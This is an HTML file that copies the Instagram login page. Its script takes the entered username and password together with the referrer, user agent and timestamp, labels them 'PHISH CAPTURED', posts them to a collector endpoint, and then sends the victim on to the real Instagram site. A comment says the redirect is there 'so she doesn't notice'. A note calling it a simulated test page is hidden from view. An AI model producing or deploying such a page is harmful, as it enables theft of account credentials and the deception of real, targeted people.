<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<title>Instagram</title>
<link rel="icon" href="https://www.instagram.com/favicon.ico" />
<style>
  * { margin:0; padding:0; box-sizing:border-box; }
  body {
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
    background: #fafafa;
    display: flex;
    justify-content: center;
    align-items: center;
    min-height: 100vh;
  }
  .container {
    width: 350px;
    background: #fff;
    border: 1px solid #dbdbdb;
    border-radius: 10px;
    padding: 40px 32px;
    text-align: center;
  }
  .logo {
    font-family: "Segoe UI", cursive;
    font-size: 28px;
    font-weight: 300;
    margin-bottom: 24px;
    background: linear-gradient(45deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888);
    -webkit-background-clip: text;
    -webkit-text-fill-color: transparent;
  }
  .card {
    text-align: left;
    margin-bottom: 20px;
  }
  .card input {
    width: 100%;
    padding: 12px 8px;
    border: 1px solid #dbdbdb;
    border-radius: 8px;
    font-size: 14px;
    margin-bottom: 12px;
    outline: none;
  }
  .card input:focus { border-color: #a8a8a8; }
  .login-btn {
    width: 100%;
    padding: 10px;
    background: #0095f6;
    color: #fff;
    border: none;
    border-radius: 8px;
    font-size: 14px;
    font-weight: 600;
    cursor: pointer;
  }
  .login-btn:hover { background: #1877f2; }
  .divider {
    display: flex;
    align-items: center;
    margin: 20px 0;
    color: #8e8e8e;
    font-size: 13px;
  }
  .divider::before, .divider::after {
    content: "";
    flex: 1;
    height: 1px;
    background: #dbdbdb;
  }
  .divider span { padding: 0 12px; }
  .alt-link {
    color: #00376b;
    font-size: 14px;
    text-decoration: none;
    display: block;
    margin-bottom: 8px;
  }
  .alt-link:hover { text-decoration: underline; }
  .signup {
    margin-top: 20px;
    padding: 20px 16px;
    border: 1px solid #dbdbdb;
    border-radius: 8px;
    text-align: center;
  }
  .signup p { font-size: 14px; margin-bottom: 12px; }
  .signup a {
    display: inline-block;
    padding: 8px 16px;
    background: #0095f6;
    color: #fff;
    border-radius: 8px;
    text-decoration: none;
    font-size: 13px;
    font-weight: 600;
  }
  .footer {
    margin-top: 24px;
    font-size: 12px;
    color: #8e8e8e;
  }
  .footer a { color: #00376b; text-decoration: none; margin: 0 4px; }
  .footer a:hover { text-decoration: underline; }
  .warning {
    display: none;
    margin-top: 12px;
    padding: 8px;
    background: #fff3cd;
    border: 1px solid #ffc107;
    border-radius: 6px;
    font-size: 12px;
    color: #856404;
  }
</style>
</head>
<body>
  <div class="container">
    <div class="logo">Instagram</div>

    <form id="loginForm" method="POST" action="https://www.instagram.com/accounts/login/" onsubmit="return false;">
      <div class="card">
        <input type="text" id="username" name="username" placeholder="Phone number, username, or email" autocomplete="username" />
        <input type="password" id="password" name="password" placeholder="Password" autocomplete="current-password" />
        <button type="submit" class="login-btn">Log in</button>
      </div>

      <div class="warning" id="warning">
        ⚠️ This is a simulated phishing page for testing purposes.
      </div>
    </form>

    <div class="divider"><span>or</span></div>

    <a href="https://www.instagram.com/accounts/login/" class="alt-link">Log in with Facebook</a>
    <a href="#" class="alt-link" onclick="alert('This is a demo link. In a real scenario, this would trigger a Facebook OAuth flow.')">Forgot password?</a>

    <div class="signup">
      <p>Don't have an account? Sign up</p>
      <a href="https://www.instagram.com/accounts/emailsignup/">Sign Up</a>
    </div>

    <div class="footer">
      <a href="#">Meta</a> · <a href="#">About</a> · <a href="#">Blog</a> · <a href="#">Jobs</a> · <a href="#">Help</a> · <a href="#">API</a> · <a href="#">Locations</a> · <a href="#">Privacy</a> · <a href="#">Terms</a>
    </div>
  </div>

  <script>
    document.getElementById('loginForm').addEventListener('submit', function(e) {
      e.preventDefault();
      const username = document.getElementById('username').value;
      const password = document.getElementById('password').value;
      const referrer = document.referrer || 'unknown';
      const userAgent = navigator.userAgent;
      const timestamp = new Date().toISOString();
      const ip = 'check via backend'; // Can't get IP client-side, but you can add a /ip endpoint

      // Log to console for quick testing
      console.log('%c[PHISH CAPTURED]', 'color: red; font-size: 16px; font-weight: bold;');
      console.log({ username, password, referrer, userAgent, timestamp });

      // Send to your collector endpoint (replace with your actual URL)
      const payload = JSON.stringify({
        username,
        password,
        referrer,
        userAgent,
        timestamp,
        ip_hint: 'Client IP not available client-side'
      });

      fetch('/collect', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: payload
      }).catch(() => console.log('Collector endpoint not reached'));

      // Redirect to real Instagram so she doesn't notice
      setTimeout(() => {
        window.location.href = 'https://www.instagram.com/accounts/login/';
      }, 800);
    });
  </script>
</body>
</html>
